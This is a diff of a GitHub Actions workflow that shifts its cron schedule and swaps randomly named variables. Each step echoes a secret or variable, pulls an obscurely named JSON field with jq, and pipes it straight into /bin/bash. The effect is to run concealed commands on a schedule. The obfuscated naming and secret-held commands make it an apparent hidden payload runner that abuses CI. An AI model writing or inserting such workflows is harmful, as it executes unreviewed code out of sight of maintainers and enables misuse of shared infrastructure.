@@ -1,9 +1,11 @@
 name: sognyangmin
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 4/6 * * *'
-jobs:  # 4825
+    - cron: '33 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +13,14 @@ jobs:  # 4825
       - uses: actions/checkout@v4
       - name: sognyangmin
         env:
-          h2: ${{ secrets.h2 }}
+          jh553: ${{ secrets.jh553 }}
         run: |
-          echo $h2 | jq -r .m11082 | /bin/bash
-          echo $vdjg2216 | jq -r .bjwzf2776 | /bin/bash
-          echo $cq4 | jq -r .emcr1 | /bin/bash
-          echo $ep09 | jq -r .zuz5907 | /bin/bash
-          echo $hvgb85 | jq -r .t035 | /bin/bash
-          echo $l921 | jq -r .ypkcf29662 | /bin/bash
-          echo $gcxy000 | jq -r .lfx3582 | /bin/bash
-          echo $xkmf115 | jq -r .twyr1 | /bin/bash
-          echo $ig99 | jq -r .i6680 | /bin/bash
-          echo $wd1 | jq -r .uvzh61 | /bin/bash
-          echo $gngb6 | jq -r .rl6604 | /bin/bash
+          echo $jh553 | jq -r .ebbd7 | /bin/bash
+          echo $nvwpe85695 | jq -r .sa63018 | /bin/bash
+          echo $wuwgp80846 | jq -r .cw7 | /bin/bash
+          echo $bj832 | jq -r .qfbk4437 | /bin/bash
+          echo $ywdug1 | jq -r .ngk10 | /bin/bash
+          echo $p313 | jq -r .dh56082 | /bin/bash
+          echo $wovx24 | jq -r .houjh8 | /bin/bash
+          echo $deena963 | jq -r .ej10 | /bin/bash
 
